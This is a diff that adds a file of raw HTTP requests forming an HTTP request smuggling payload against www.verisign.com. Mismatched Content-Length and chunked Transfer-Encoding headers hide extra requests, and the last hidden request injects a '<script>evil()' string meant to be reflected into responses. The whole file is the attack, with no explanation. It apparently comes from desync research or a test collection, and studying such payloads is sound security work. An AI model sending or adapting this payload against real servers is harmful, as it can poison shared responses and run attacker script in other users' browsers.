@@ -1,0 +1,18 @@
+POST /%2f HTTP/1.1
+Host: www.verisign.com
+Content-Length: 81
+
+HEAD / HTTP/1.1
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+34d
+POST / HTTP/1.1
+Host: www.verisign.com
+Content-Length: 59
+
+0
+
+GET /<script>evil() HTTP/1.1
+Host: www.verisign.com
+
